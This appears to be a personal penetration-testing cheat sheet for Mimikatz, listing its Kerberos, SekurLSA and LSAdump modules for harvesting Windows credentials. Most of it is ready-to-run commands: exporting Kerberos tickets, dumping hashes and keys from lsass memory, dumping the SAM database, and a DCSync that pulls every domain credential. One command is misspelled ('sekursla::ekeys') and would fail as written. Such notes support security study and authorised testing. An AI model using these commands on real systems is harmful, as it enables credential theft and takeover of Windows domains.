- Used to harvest credentials from a windows machine.
- Has two additional components:
	- `Mimidrv`: driver that interacts with windows kernel
	- `Mimilib`: Bypass applocker, auth package/SSP etc.
- Runs with:
	- `Administrator` with `Privilege::debug` mode
	- `SYSTEM` privilege

# Kerberos
### ask
```bash
kerberos::ask
```
### list
- Lists or exports TGTs and STs from the current session
```powershell
kerberos::list # Lists the tickets
kerberos::list /export # Export the tickets to files
```
### purge
- purge all TGTs and STs from the current session.
```powershell
kerberos::purge
```
### tgt
- Prints information about the TGT from current session
```powershell
kerberos::tgt
```
### golden
[Golden Tickets](Active%20Directory/Initial%20Foothold/Kerberos#Golden%20Tickets)
- Create golden tickets from krbtgt's NTLM hash or Kerberos keys.
### silver
- Create silver ticket from a service's NTLM hash or Kerberos keys.

# SekurLSA
Dumps keys, password hashes, pin codes from protected memory of lsass.exe proccess.
Rights required:
- SYSTEM
- Administrator with debug privilege (privilege::debug)
### backupkeys
- get backup master keys.
```powershell
sekurlsa::backupkey
```
### credman
- Lists credential manager
```powershell
sekurlsa::credman
```
### dpapi
[DPAPI](../Windows/Windows%20Internals/Uncategorized/DPAPI.md)
- Lists cached master keys
```powershell
sekurlsa::dpapi
```
### ekeys
Lists kerberos encryption keys
```powershell
sekursla::ekeys
```
# LSAdump
### sam
- Dumps the sam database directory from memory or offline using the sam and system registry hives.
```powershell
# On target machine
lsadump::sam
# Using system and sam hives
lsadump::sam /system:system.hiv /sam:sam.hiv
```
### dcsync
- Perform dc-sync on the domain controller to dump ntds credentails, keys etc.
```powershell
# Dump credential of a specidic user
lsadump::dcsync /domain:mydomain.local /user:dr.dragon
# Dump all credentials
lsadump::dcsync /domain:mydomain.local /all
```